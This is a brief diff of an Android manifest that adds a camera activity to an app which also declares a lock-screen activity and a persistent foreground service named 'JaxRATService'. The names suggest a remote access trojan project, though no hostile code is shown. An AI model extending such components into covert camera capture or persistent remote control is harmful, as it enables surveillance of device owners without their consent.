@@ -27,7 +27,7 @@
         </activity>
 
         <activity android:name=".LockScreenActivity" android:theme="@android:style/Theme.DeviceDefault.NoActionBar" />
-
+        <activity android:name=".CameraActivity" />
         <service android:name=".JaxRATService" android:foregroundServiceType="dataSync" android:stopWithTask="false" />
     </application>
 </manifest>
